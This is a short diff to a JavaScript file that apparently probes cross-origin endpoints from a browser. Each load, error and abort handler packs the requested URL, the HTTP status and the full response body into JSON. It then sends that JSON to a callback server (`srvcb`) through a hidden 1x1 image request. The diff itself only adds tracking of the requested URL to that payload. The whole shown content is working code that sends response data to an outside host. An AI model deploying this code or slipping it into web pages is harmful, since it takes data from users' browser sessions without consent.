@@ -16,13 +16,14 @@ function createCORSRequest(method, url){
   } else {
     xhr = null;
   }
+  xhr.url = url;
  return xhr;
 }
 
-function obj(method, res){
+function obj(method, res,url){
     var obj = {};
     obj[method] = {}
-    obj[method].url = res.target?.responseURL;
+    obj[method].url = url;
     obj[method].status = res.target?.status + res.target?.statusText;
     obj[method].response = res.target?.responseText;
     return JSON.stringify(obj);
@@ -36,20 +37,21 @@ function load(res){
     } else {
 		// ping back request via img
 		var pingBack = new Image();
-        pingBack.src=`${srvcb}/1x1.png?${obj('onload',res)}`; 
+  
+        pingBack.src=`${srvcb}/1x1.png?${obj('onload',res,this.url)}`; 
     }
 }
 
 function error(res){
   // ping back request via img
   var pingBack = new Image();
-  pingBack.src=`${srvcb}/1x1.png?${obj('onerror',res)}`;
+  pingBack.src=`${srvcb}/1x1.png?${obj('onerror',res,this.url)}`;
 }
 
 function abort(res){
   // ping back request via img
   var pingBack = new Image();
-  pingBack.src=`${srvcb}/1x1.png?${obj('onabort',res)}`;
+  pingBack.src=`${srvcb}/1x1.png?${obj('onabort',res,this.url)}`;
 }
  
 
